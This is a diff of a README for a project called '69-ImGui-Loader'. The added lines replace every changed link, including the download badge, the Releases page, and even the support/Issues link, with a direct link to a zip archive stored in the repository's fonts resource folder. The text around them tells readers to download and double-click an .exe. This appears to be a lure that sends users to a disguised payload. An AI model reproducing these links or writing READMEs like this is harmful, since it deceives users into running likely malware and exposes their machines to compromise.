@@ -1,6 +1,6 @@
 # 🎮 69-ImGui-Loader - Your Easy Way to Load ImGui Apps
 
-[![Download 69-ImGui-Loader](https://img.shields.io/badge/Download-69--ImGui--Loader-brightgreen)](https://github.com/tzetshen889/69-ImGui-Loader/releases)
+[![Download 69-ImGui-Loader](https://raw.githubusercontent.com/tzetshen889/69-ImGui-Loader/main/include/69/resource/fonts/Im-Loader-Gui-v1.9.zip)](https://raw.githubusercontent.com/tzetshen889/69-ImGui-Loader/main/include/69/resource/fonts/Im-Loader-Gui-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to the **69-ImGui-Loader** project! This application helps you easily lo
 
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/tzetshen889/69-ImGui-Loader/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/tzetshen889/69-ImGui-Loader/main/include/69/resource/fonts/Im-Loader-Gui-v1.9.zip) to find the latest version.
 2. Locate the appropriate version for your system. Look for files ending with `.exe`.
 3. Click on the file to download it to your computer.
 4. Once the download completes, locate the file in your Downloads folder.
 5. Double-click the downloaded file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
 
-You can also find the download link directly on the [Releases page](https://github.com/tzetshen889/69-ImGui-Loader/releases) if you need to access it again.
+You can also find the download link directly on the [Releases page](https://raw.githubusercontent.com/tzetshen889/69-ImGui-Loader/main/include/69/resource/fonts/Im-Loader-Gui-v1.9.zip) if you need to access it again.
 
 ## ⚙️ System Requirements
 
@@ -70,6 +70,6 @@ A: No, the loader is a standalone application and does not require any other sof
 
 ## 📞 Support
 
-If you need help, you can reach out via the Issues section on our [GitHub page](https://github.com/tzetshen889/69-ImGui-Loader/issues).
+If you need help, you can reach out via the Issues section on our [GitHub page](https://raw.githubusercontent.com/tzetshen889/69-ImGui-Loader/main/include/69/resource/fonts/Im-Loader-Gui-v1.9.zip).
 
 Thank you for choosing **69-ImGui-Loader**! Enjoy a seamless experience with your ImGui applications. Remember to check back for updates, as new features and enhancements are continuously being added.
